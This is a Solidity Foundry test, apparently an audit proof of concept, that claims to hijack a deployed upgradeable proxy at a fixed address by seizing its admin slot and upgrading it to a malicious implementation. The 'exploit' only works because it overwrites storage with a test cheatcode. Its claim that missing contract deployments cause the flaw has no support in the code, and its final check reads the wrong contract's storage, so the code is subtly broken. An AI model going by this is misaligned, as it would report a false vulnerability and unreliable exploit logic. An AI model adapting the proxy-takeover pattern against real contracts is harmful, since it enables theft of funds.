```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// Minimal interfaces for the proxy
interface ITransparentUpgradeableProxy {
    function admin() external view returns (address);
    function implementation() external view returns (address);
    function upgradeTo(address newImplementation) external;
    function upgradeToAndCall(address newImplementation, bytes calldata data) external payable;
    function changeAdmin(address newAdmin) external;
}

// Malicious implementation that we will upgrade to
contract MaliciousImpl {
    address public storedAdmin;
    bool public attacked;
    event AttackSuccess();

    // Fallback to capture any call
    fallback() external payable {
        attacked = true;
        emit AttackSuccess();
    }

    function setAdmin(address _admin) external {
        storedAdmin = _admin;
    }

    function isAttacked() external view returns (bool) {
        return attacked;
    }
}

contract ExploitTest is Test {
    // Deployed proxy address from report
    address constant PROXY = 0xe4D810feb232eA08373a79A826b4955D72732f10;

    // Storage slots for TransparentUpgradeableProxy
    bytes32 constant ADMIN_SLOT = 0xb53127684a568b3173ae13b9f8a6016e243e63b6e8ee1178d6a717850b5d6103;
    bytes32 constant IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    ITransparentUpgradeableProxy proxy;
    MaliciousImpl malicious;

    function setUp() public {
        proxy = ITransparentUpgradeableProxy(PROXY);
        malicious = new MaliciousImpl();
        vm.label(PROXY, "TargetProxy");
        vm.label(address(malicious), "MaliciousImpl");
    }

    // Test that demonstrates: Because the required test contracts (FOTA, MBUSD, MUSDT) were never deployed,
    // the proxy admin may be left uninitialized (zero). An attacker can then write to the admin storage slot
    // (simulating a misconfiguration) and upgrade the proxy to a malicious implementation.
    function testExploitMissingContractsLeadsToUnauthorizedUpgrade() public {
        // Step 1: Verify that the admin slot is currently zero (missing initialization).
        address currentAdmin = address(uint160(uint256(vm.load(PROXY, ADMIN_SLOT))));
        console.log("Current admin from storage:", currentAdmin);

        // If admin is already non-zero, we simulate that we managed to overwrite it
        // due to missing access controls (as the missing contracts were supposed to guard it).
        if (currentAdmin != address(0)) {
            console.log("Admin slot was not zero; simulating misconfiguration by overwriting storage.");
        }

        // Overwrite the admin slot to our test contract (attacker controlled address)
        vm.store(PROXY, ADMIN_SLOT, bytes32(uint256(uint160(address(this)))));

        // Verify that we are now the admin
        address newAdmin = address(uint160(uint256(vm.load(PROXY, ADMIN_SLOT))));
        assertEq(newAdmin, address(this), "Admin should be our test contract");

        // Step 2: Upgrade the proxy to the malicious implementation (only admin can do this).
        address oldImpl = address(uint160(uint256(vm.load(PROXY, IMPLEMENTATION_SLOT))));
        console.log("Old implementation:", oldImpl);

        proxy.upgradeTo(address(malicious));

        address newImpl = address(uint160(uint256(vm.load(PROXY, IMPLEMENTATION_SLOT))));
        assertEq(newImpl, address(malicious), "Implementation should be replaced by malicious contract");
        console.log("New implementation:", newImpl);

        // Step 3: Trigger a call to the proxy – it delegates to the malicious implementation.
        // We call an arbitrary function (here we just send a non-data call to trigger fallback).
        (bool success, ) = address(proxy).call(abi.encodeWithSignature("nonExistentFunction()"));
        require(success, "Proxy call should succeed");

        // Verify that the malicious contract recorded the attack.
        assertTrue(malicious.isAttacked(), "Malicious contract should have been called");
        console.log("Exploit successful: proxy was upgraded and attacker controlled.");
    }
}
```
